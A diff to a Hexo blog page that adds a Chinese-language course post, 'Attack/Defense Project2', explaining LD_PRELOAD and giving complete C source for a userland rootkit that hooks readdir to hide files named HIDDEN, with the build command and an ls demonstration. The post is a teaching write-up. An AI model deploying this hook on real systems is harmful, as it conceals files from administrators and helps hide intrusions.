@@ -169,6 +169,68 @@
 
       <div class="body-wrap">
   
+    <article id="post-project2" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2016/01/18/project2/" class="article-date">
+  	<time datetime="2016-01-18T07:36:24.000Z" itemprop="datePublished">2016-01-18</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2016/01/18/project2/">攻防Project2 - LD_PRELOAD實作library rootkit</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="LD_PRELOAD"><a href="#LD_PRELOAD" class="headerlink" title="LD_PRELOAD"></a>LD_PRELOAD</h2><p>LD_PRELOAD是Linux/Unix下的環境變數，他可以決定預先要載入的共享函式庫<br>它比LD_LIBRARY_PATH指定的共用函式庫還要優先，因此LD_PRELOAD裡的全域符號會蓋掉後面載入的同名全域符號<br>所以我們可以利用LD_PRELOAD來達成Linux/Unix下的hook，要達到rootkit的效果也就輕而易舉<br>但這只對動態連結的程式有效，因為靜態連結函式庫的代碼都已經包進程式中</p>
+<h2 id="u5BE6_u4F5C"><a href="#u5BE6_u4F5C" class="headerlink" title="實作"></a>實作</h2><p>因為ls用到readdir這個函數來實作<br>所以我們覆蓋掉libc裡面的readdir來實作rootkit<br>做法很簡單，載入libc中原本的readdir(我們叫它old_readdir)<br>然後把結果中有”HIDDEN”的都濾掉</p>
+<p>code如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;dirent.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;dlfcn.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> *libc = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> dirent *(*old_readdir)(DIR *dirp);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">struct</span> dirent *<span class="title">readdir</span><span class="params">(DIR *dirp)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">struct</span> dirent *ret = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (<span class="literal">NULL</span> == libc) &#123;</span><br><span class="line">		<span class="keyword">if</span> (<span class="literal">NULL</span> == (libc = dlopen(<span class="string">"/lib/libc.so.6"</span>, RTLD_LAZY))) &#123;</span><br><span class="line">			<span class="keyword">goto</span> END;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (<span class="literal">NULL</span> == old_readdir) &#123;</span><br><span class="line">		<span class="keyword">if</span> (<span class="literal">NULL</span> == (old_readdir = dlsym(libc, <span class="string">"readdir"</span>))) &#123;</span><br><span class="line">			<span class="keyword">goto</span> END;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line">		ret = old_readdir(dirp);</span><br><span class="line">		<span class="keyword">if</span> (ret &amp;&amp; <span class="number">0</span> == <span class="built_in">strcmp</span>(ret-&gt;d_name, <span class="string">"HIDDEN"</span>)) &#123;</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">END:</span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>編譯一下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ gcc -fPIC -shared -o rootkit.so rootkit.c</span><br></pre></td></tr></table></figure></p>
+<p>設置LD_PRELOAD並執行ls<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ /bin/ls&#10;rootkit.c rootkit.so HIDDEN&#10;$ env LD_PRELOAD=./rootkit.so /bin/ls&#10;rootkit.c rootkit.so</span><br></pre></td></tr></table></figure></p>
+<p>即可發現當前目錄下名字為HIDDEN的都消失了，就算下參數-al也一樣</p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/NCU/">NCU</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/筆記/">筆記</a></li></ul>
+	</div>
+
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+  
     <article id="post-project1" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
@@ -240,7 +302,7 @@
   <div class="outer">
     <div id="footer-info">
     	<div class="footer-left">
-    		&copy; 2016 KaiBro
+    		&copy; 2017 KaiBro
     	</div>
       	<div class="footer-right">
       		<a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/litten/hexo-theme-yilia" target="_blank">Yilia</a> by Litten
